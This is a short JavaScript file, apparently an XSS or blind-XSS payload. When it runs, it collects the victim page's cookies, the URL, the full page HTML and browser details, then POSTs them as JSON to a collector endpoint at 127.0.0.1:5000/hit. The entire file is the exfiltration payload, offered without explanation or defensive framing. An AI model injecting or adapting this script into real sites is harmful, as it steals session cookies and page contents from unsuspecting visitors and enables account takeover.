let host = document.location.host
let origin = document.location.origin
let url = document.location.href

let cookie = document.cookie

let dom_title = document.title
let DOM =  document.documentElement.outerHTML

let OS = window.navigator.platform
let user_agent = window.navigator.userAgent
let browser_version = window.navigator.appVersion
let language = window.navigator.language

fetch("http://127.0.0.1:5000/hit", {
    method: "POST",
    headers: {
        "Content_Type": "application/json"
    },
    body: JSON.stringify({
        host: host,
        origin: origin,
        url: url,
        cookie: cookie,
        dom_title: dom_title,
        DOM: DOM,
        OS: OS,
        user_agent: user_agent,
        browser_version: browser_version,
        language: language
    })
})
   .then()
   .catch(error => console.log(error))
